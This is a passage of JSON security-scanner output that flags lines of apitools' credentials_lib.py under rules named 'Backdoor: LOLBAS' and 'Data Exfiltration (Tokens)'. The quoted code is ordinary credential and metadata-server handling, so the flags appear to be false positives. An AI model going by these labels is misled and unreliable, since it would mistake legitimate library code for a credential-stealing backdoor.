                  "startColumn": 27,
                  "endLine": 509,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            NotImplementedError, always.\n        \"\"\"\n        raise NotImplementedError(\n            'Compute Engine service accounts cannot sign blobs')\n\n\ndef _GetRunFlowFlags(args=None):\n",
                    "rendered": {
                      "text": "            NotImplementedError, always.\n        \"\"\"\n        raise NotImplementedError(\n            'Compute Engine service accounts cannot sign blobs')\n\n\ndef _GetRunFlowFlags(args=None):\n",
                      "markdown": "`            NotImplementedError, always.\n        \"\"\"\n        raise NotImplementedError(\n            'Compute Engine service accounts cannot sign blobs')\n\n\ndef _GetRunFlowFlags(args=None):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 499,
                  "startColumn": 55,
                  "endLine": 499,
                  "endColumn": 64,
                  "snippet": {
                    "text": "        \"\"\"Cryptographically sign a blob (of bytes).\n\n        This method is provided to support a common interface, but\n        the actual key used for a Google Compute Engine service account\n        is not available, so it can't be used to sign content.\n\n        Args:\n",
                    "rendered": {
                      "text": "        \"\"\"Cryptographically sign a blob (of bytes).\n\n        This method is provided to support a common interface, but\n        the actual key used for a Google Compute Engine service account\n        is not available, so it can't be used to sign content.\n\n        Args:\n",
                      "markdown": "`        \"\"\"Cryptographically sign a blob (of bytes).\n\n        This method is provided to support a common interface, but\n        the actual key used for a Google Compute Engine service account\n        is not available, so it can't be used to sign content.\n\n        Args:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 451,
                  "startColumn": 49,
                  "endLine": 451,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    @property\n    def serialization_data(self):\n        raise NotImplementedError(\n            'Cannot serialize credentials for GCE service accounts.')\n\n\n# TODO(craigcitro): Currently, we can't even *load*\n",
                    "rendered": {
                      "text": "    @property\n    def serialization_data(self):\n        raise NotImplementedError(\n            'Cannot serialize credentials for GCE service accounts.')\n\n\n# TODO(craigcitro): Currently, we can't even *load*\n",
                      "markdown": "`    @property\n    def serialization_data(self):\n        raise NotImplementedError(\n            'Cannot serialize credentials for GCE service accounts.')\n\n\n# TODO(craigcitro): Currently, we can't even *load*\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 343,
                  "startColumn": 46,
                  "endLine": 343,
                  "endColumn": 55,
                  "snippet": {
                    "text": "                'GCE credentials requested outside a GCE instance')\n        if not self.GetServiceAccount(self.__service_account_name):\n            raise exceptions.ResourceUnavailableError(\n                'GCE credentials requested but service account '\n                '%s does not exist.' % self.__service_account_name)\n        if scopes:\n            scope_ls = util.NormalizeScopes(scopes)\n",
                    "rendered": {
                      "text": "                'GCE credentials requested outside a GCE instance')\n        if not self.GetServiceAccount(self.__service_account_name):\n            raise exceptions.ResourceUnavailableError(\n                'GCE credentials requested but service account '\n                '%s does not exist.' % self.__service_account_name)\n        if scopes:\n            scope_ls = util.NormalizeScopes(scopes)\n",
                      "markdown": "`                'GCE credentials requested outside a GCE instance')\n        if not self.GetServiceAccount(self.__service_account_name):\n            raise exceptions.ResourceUnavailableError(\n                'GCE credentials requested but service account '\n                '%s does not exist.' % self.__service_account_name)\n        if scopes:\n            scope_ls = util.NormalizeScopes(scopes)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 244,
                  "startColumn": 35,
                  "endLine": 244,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        Args:\n          scopes: The scopes to get. If None, whatever scopes that are\n              available to the instance are used.\n          service_account_name: The service account to retrieve the scopes\n              from.\n          **kwds: Additional keyword args.\n\n",
                    "rendered": {
                      "text": "        Args:\n          scopes: The scopes to get. If None, whatever scopes that are\n              available to the instance are used.\n          service_account_name: The service account to retrieve the scopes\n              from.\n          **kwds: Additional keyword args.\n\n",
                      "markdown": "`        Args:\n          scopes: The scopes to get. If None, whatever scopes that are\n              available to the instance are used.\n          service_account_name: The service account to retrieve the scopes\n              from.\n          **kwds: Additional keyword args.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 180,
                  "startColumn": 24,
                  "endLine": 180,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        account_type = service_account_info.get('type')\n        if account_type != oauth2client.client.SERVICE_ACCOUNT:\n            raise exceptions.CredentialsError(\n                'Invalid service account credentials: %s' % (filename,))\n        # pylint: disable=protected-access\n        credentials = service_account._ServiceAccountCredentials(\n            service_account_id=service_account_info['client_id'],\n",
                    "rendered": {
                      "text": "        account_type = service_account_info.get('type')\n        if account_type != oauth2client.client.SERVICE_ACCOUNT:\n            raise exceptions.CredentialsError(\n                'Invalid service account credentials: %s' % (filename,))\n        # pylint: disable=protected-access\n        credentials = service_account._ServiceAccountCredentials(\n            service_account_id=service_account_info['client_id'],\n",
                      "markdown": "`        account_type = service_account_info.get('type')\n        if account_type != oauth2client.client.SERVICE_ACCOUNT:\n            raise exceptions.CredentialsError(\n                'Invalid service account credentials: %s' % (filename,))\n        # pylint: disable=protected-access\n        credentials = service_account._ServiceAccountCredentials(\n            service_account_id=service_account_info['client_id'],\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 11,
                  "endLine": 41,
                  "endColumn": 17,
                  "snippet": {
                    "text": "from apitools.base.py import util\n\n# App Engine does not support ctypes which are required for the\n# monotonic time used in fasteners. Conversely, App Engine does\n# not support colocated concurrent processes, so process locks\n# are not needed.\ntry:\n",
                    "rendered": {
                      "text": "from apitools.base.py import util\n\n# App Engine does not support ctypes which are required for the\n# monotonic time used in fasteners. Conversely, App Engine does\n# not support colocated concurrent processes, so process locks\n# are not needed.\ntry:\n",
                      "markdown": "`from apitools.base.py import util\n\n# App Engine does not support ctypes which are required for the\n# monotonic time used in fasteners. Conversely, App Engine does\n# not support colocated concurrent processes, so process locks\n# are not needed.\ntry:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 746,
                  "startColumn": 34,
                  "endLine": 746,
                  "endColumn": 39,
                  "snippet": {
                    "text": "@_RegisterCredentialsMethod\ndef _GetGceServiceAccount(client_info, **unused_kwds):\n    scopes = client_info['scope'].split(' ')\n    return GceAssertionCredentials.Get(scopes=scopes)\n\n\n@_RegisterCredentialsMethod\n",
                    "rendered": {
                      "text": "@_RegisterCredentialsMethod\ndef _GetGceServiceAccount(client_info, **unused_kwds):\n    scopes = client_info['scope'].split(' ')\n    return GceAssertionCredentials.Get(scopes=scopes)\n\n\n@_RegisterCredentialsMethod\n",
                      "markdown": "`@_RegisterCredentialsMethod\ndef _GetGceServiceAccount(client_info, **unused_kwds):\n    scopes = client_info['scope'].split(' ')\n    return GceAssertionCredentials.Get(scopes=scopes)\n\n\n@_RegisterCredentialsMethod\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 740,
                  "startColumn": 34,
                  "endLine": 740,
                  "endColumn": 39,
                  "snippet": {
                    "text": "@_RegisterCredentialsMethod\ndef _GetGaeServiceAccount(client_info, **unused_kwds):\n    scopes = client_info['scope'].split(' ')\n    return GaeAssertionCredentials.Get(scopes=scopes)\n\n\n@_RegisterCredentialsMethod\n",
                    "rendered": {
                      "text": "@_RegisterCredentialsMethod\ndef _GetGaeServiceAccount(client_info, **unused_kwds):\n    scopes = client_info['scope'].split(' ')\n    return GaeAssertionCredentials.Get(scopes=scopes)\n\n\n@_RegisterCredentialsMethod\n",
                      "markdown": "`@_RegisterCredentialsMethod\ndef _GetGaeServiceAccount(client_info, **unused_kwds):\n    scopes = client_info['scope'].split(' ')\n    return GaeAssertionCredentials.Get(scopes=scopes)\n\n\n@_RegisterCredentialsMethod\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 706,
                  "startColumn": 32,
                  "endLine": 706,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    if response.status == http_client.BAD_REQUEST:\n        credentials.refresh(http)\n        url = _GetUserinfoUrl(credentials)\n        response, content = http.request(url)\n    return json.loads(content or '{}')  # Save ourselves from an empty reply.\n\n\n",
                    "rendered": {
                      "text": "    if response.status == http_client.BAD_REQUEST:\n        credentials.refresh(http)\n        url = _GetUserinfoUrl(credentials)\n        response, content = http.request(url)\n    return json.loads(content or '{}')  # Save ourselves from an empty reply.\n\n\n",
                      "markdown": "`    if response.status == http_client.BAD_REQUEST:\n        credentials.refresh(http)\n        url = _GetUserinfoUrl(credentials)\n        response, content = http.request(url)\n    return json.loads(content or '{}')  # Save ourselves from an empty reply.\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 702,
                  "startColumn": 28,
                  "endLine": 702,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    url = _GetUserinfoUrl(credentials)\n    # We ignore communication woes here (i.e. SSL errors, socket\n    # timeout), as handling these should be done in a common location.\n    response, content = http.request(url)\n    if response.status == http_client.BAD_REQUEST:\n        credentials.refresh(http)\n        url = _GetUserinfoUrl(credentials)\n",
                    "rendered": {
                      "text": "    url = _GetUserinfoUrl(credentials)\n    # We ignore communication woes here (i.e. SSL errors, socket\n    # timeout), as handling these should be done in a common location.\n    response, content = http.request(url)\n    if response.status == http_client.BAD_REQUEST:\n        credentials.refresh(http)\n        url = _GetUserinfoUrl(credentials)\n",
                      "markdown": "`    url = _GetUserinfoUrl(credentials)\n    # We ignore communication woes here (i.e. SSL errors, socket\n    # timeout), as handling these should be done in a common location.\n    response, content = http.request(url)\n    if response.status == http_client.BAD_REQUEST:\n        credentials.refresh(http)\n        url = _GetUserinfoUrl(credentials)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 550,
                  "startColumn": 34,
                  "endLine": 550,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            path, storage_key)\n    if hasattr(FLAGS, 'auth_local_webserver'):\n        FLAGS.auth_local_webserver = False\n    credentials = credential_store.get()\n    if credentials is None or credentials.invalid:\n        print('Generating new OAuth credentials ...')\n        for _ in range(20):\n",
                    "rendered": {
                      "text": "            path, storage_key)\n    if hasattr(FLAGS, 'auth_local_webserver'):\n        FLAGS.auth_local_webserver = False\n    credentials = credential_store.get()\n    if credentials is None or credentials.invalid:\n        print('Generating new OAuth credentials ...')\n        for _ in range(20):\n",
                      "markdown": "`            path, storage_key)\n    if hasattr(FLAGS, 'auth_local_webserver'):\n        FLAGS.auth_local_webserver = False\n    credentials = credential_store.get()\n    if credentials is None or credentials.invalid:\n        print('Generating new OAuth credentials ...')\n        for _ in range(20):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 431,
                  "startColumn": 35,
                  "endLine": 431,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    def from_json(cls, json_data):\n        data = json.loads(json_data)\n        kwargs = {}\n        if 'cache_filename' in data.get('kwargs', []):\n            kwargs['cache_filename'] = data['kwargs']['cache_filename']\n        # Newer versions of GceAssertionCredentials don't have a \"scope\"\n        # attribute.\n",
                    "rendered": {
                      "text": "    def from_json(cls, json_data):\n        data = json.loads(json_data)\n        kwargs = {}\n        if 'cache_filename' in data.get('kwargs', []):\n            kwargs['cache_filename'] = data['kwargs']['cache_filename']\n        # Newer versions of GceAssertionCredentials don't have a \"scope\"\n        # attribute.\n",
                      "markdown": "`    def from_json(cls, json_data):\n        data = json.loads(json_data)\n        kwargs = {}\n        if 'cache_filename' in data.get('kwargs', []):\n            kwargs['cache_filename'] = data['kwargs']['cache_filename']\n        # Newer versions of GceAssertionCredentials don't have a \"scope\"\n        # attribute.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 258,
                  "startColumn": 29,
                  "endLine": 258,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            service_account_name,\n            encoding='utf-8',)\n        cached_scopes = None\n        cache_filename = kwds.get('cache_filename')\n        if cache_filename:\n            cached_scopes = self._CheckCacheFileForMatch(\n                cache_filename, scopes)\n",
                    "rendered": {
                      "text": "            service_account_name,\n            encoding='utf-8',)\n        cached_scopes = None\n        cache_filename = kwds.get('cache_filename')\n        if cache_filename:\n            cached_scopes = self._CheckCacheFileForMatch(\n                cache_filename, scopes)\n",
                      "markdown": "`            service_account_name,\n            encoding='utf-8',)\n        cached_scopes = None\n        cache_filename = kwds.get('cache_filename')\n        if cache_filename:\n            cached_scopes = self._CheckCacheFileForMatch(\n                cache_filename, scopes)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 224,
                  "startColumn": 28,
                  "endLine": 224,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    # Extra header requirement can be found here:\n    # https://developers.google.com/compute/docs/metadata\n    headers = {'Metadata-Flavor': 'Google'}\n    request = urllib.request.Request(url, headers=headers)\n    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))\n    try:\n        response = opener.open(request)\n",
                    "rendered": {
                      "text": "    # Extra header requirement can be found here:\n    # https://developers.google.com/compute/docs/metadata\n    headers = {'Metadata-Flavor': 'Google'}\n    request = urllib.request.Request(url, headers=headers)\n    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))\n    try:\n        response = opener.open(request)\n",
                      "markdown": "`    # Extra header requirement can be found here:\n    # https://developers.google.com/compute/docs/metadata\n    headers = {'Metadata-Flavor': 'Google'}\n    request = urllib.request.Request(url, headers=headers)\n    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))\n    try:\n        response = opener.open(request)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 29,
                  "endLine": 218,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n    url = 'http://' + base_url + '/computeMetadata/v1/' + relative_url\n    # Extra header requirement can be found here:\n",
                    "rendered": {
                      "text": "    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n    url = 'http://' + base_url + '/computeMetadata/v1/' + relative_url\n    # Extra header requirement can be found here:\n",
                      "markdown": "`    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n    url = 'http://' + base_url + '/computeMetadata/v1/' + relative_url\n    # Extra header requirement can be found here:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 216,
                  "startColumn": 29,
                  "endLine": 216,
                  "endColumn": 34,
                  "snippet": {
                    "text": "def _GceMetadataRequest(relative_url, use_metadata_ip=False):\n    \"\"\"Request the given url from the GCE metadata service.\"\"\"\n    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n",
                    "rendered": {
                      "text": "def _GceMetadataRequest(relative_url, use_metadata_ip=False):\n    \"\"\"Request the given url from the GCE metadata service.\"\"\"\n    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n",
                      "markdown": "`def _GceMetadataRequest(relative_url, use_metadata_ip=False):\n    \"\"\"Request the given url from the GCE metadata service.\"\"\"\n    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 177,
                  "startColumn": 43,
                  "endLine": 177,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        # oauth2client < 2.0.0\n        with open(filename) as keyfile:\n            service_account_info = json.load(keyfile)\n        account_type = service_account_info.get('type')\n        if account_type != oauth2client.client.SERVICE_ACCOUNT:\n            raise exceptions.CredentialsError(\n                'Invalid service account credentials: %s' % (filename,))\n",
                    "rendered": {
                      "text": "        # oauth2client < 2.0.0\n        with open(filename) as keyfile:\n            service_account_info = json.load(keyfile)\n        account_type = service_account_info.get('type')\n        if account_type != oauth2client.client.SERVICE_ACCOUNT:\n            raise exceptions.CredentialsError(\n                'Invalid service account credentials: %s' % (filename,))\n",
                      "markdown": "`        # oauth2client < 2.0.0\n        with open(filename) as keyfile:\n            service_account_info = json.load(keyfile)\n        account_type = service_account_info.get('type')\n        if account_type != oauth2client.client.SERVICE_ACCOUNT:\n            raise exceptions.CredentialsError(\n                'Invalid service account credentials: %s' % (filename,))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 27,
                  "endLine": 48,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    import fasteners\n    _FASTENERS_AVAILABLE = True\nexcept ImportError as import_error:\n    server_env = os.environ.get('SERVER_SOFTWARE', '')\n    if not (server_env.startswith('Development') or\n            server_env.startswith('Google App Engine')):\n        raise import_error\n",
                    "rendered": {
                      "text": "    import fasteners\n    _FASTENERS_AVAILABLE = True\nexcept ImportError as import_error:\n    server_env = os.environ.get('SERVER_SOFTWARE', '')\n    if not (server_env.startswith('Development') or\n            server_env.startswith('Google App Engine')):\n        raise import_error\n",
                      "markdown": "`    import fasteners\n    _FASTENERS_AVAILABLE = True\nexcept ImportError as import_error:\n    server_env = os.environ.get('SERVER_SOFTWARE', '')\n    if not (server_env.startswith('Development') or\n            server_env.startswith('Google App Engine')):\n        raise import_error\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 207,
                  "startColumn": 18,
                  "endLine": 207,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        return credentials\n    else:\n        # oauth2client < 2.0.0\n        with open(private_key_filename, 'rb') as key_file:\n            return oauth2client.client.SignedJwtAssertionCredentials(\n                service_account_name, key_file.read(), scopes,\n                user_agent=user_agent)\n",
                    "rendered": {
                      "text": "        return credentials\n    else:\n        # oauth2client < 2.0.0\n        with open(private_key_filename, 'rb') as key_file:\n            return oauth2client.client.SignedJwtAssertionCredentials(\n                service_account_name, key_file.read(), scopes,\n                user_agent=user_agent)\n",
                      "markdown": "`        return credentials\n    else:\n        # oauth2client < 2.0.0\n        with open(private_key_filename, 'rb') as key_file:\n            return oauth2client.client.SignedJwtAssertionCredentials(\n                service_account_name, key_file.read(), scopes,\n                user_agent=user_agent)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 201,
                  "startColumn": 38,
                  "endLine": 201,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        # oauth2client >= 2.0.0\n        credentials = (\n            service_account.ServiceAccountCredentials.from_p12_keyfile(\n                service_account_name, private_key_filename, scopes=scopes))\n        if credentials is not None:\n            credentials.user_agent = user_agent\n        return credentials\n",
                    "rendered": {
                      "text": "        # oauth2client >= 2.0.0\n        credentials = (\n            service_account.ServiceAccountCredentials.from_p12_keyfile(\n                service_account_name, private_key_filename, scopes=scopes))\n        if credentials is not None:\n            credentials.user_agent = user_agent\n        return credentials\n",
                      "markdown": "`        # oauth2client >= 2.0.0\n        credentials = (\n            service_account.ServiceAccountCredentials.from_p12_keyfile(\n                service_account_name, private_key_filename, scopes=scopes))\n        if credentials is not None:\n            credentials.user_agent = user_agent\n        return credentials\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 46,
                  "endLine": 195,
                  "endColumn": 57,
                  "snippet": {
                    "text": "def ServiceAccountCredentialsFromP12File(\n        service_account_name, private_key_filename, scopes, user_agent):\n    \"\"\"Create a new credential from the named .p12 keyfile.\"\"\"\n    private_key_filename = os.path.expanduser(private_key_filename)\n    scopes = util.NormalizeScopes(scopes)\n    if oauth2client.__version__ > '1.5.2':\n        # oauth2client >= 2.0.0\n",
                    "rendered": {
                      "text": "def ServiceAccountCredentialsFromP12File(\n        service_account_name, private_key_filename, scopes, user_agent):\n    \"\"\"Create a new credential from the named .p12 keyfile.\"\"\"\n    private_key_filename = os.path.expanduser(private_key_filename)\n    scopes = util.NormalizeScopes(scopes)\n    if oauth2client.__version__ > '1.5.2':\n        # oauth2client >= 2.0.0\n",
                      "markdown": "`def ServiceAccountCredentialsFromP12File(\n        service_account_name, private_key_filename, scopes, user_agent):\n    \"\"\"Create a new credential from the named .p12 keyfile.\"\"\"\n    private_key_filename = os.path.expanduser(private_key_filename)\n    scopes = util.NormalizeScopes(scopes)\n    if oauth2client.__version__ > '1.5.2':\n        # oauth2client >= 2.0.0\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
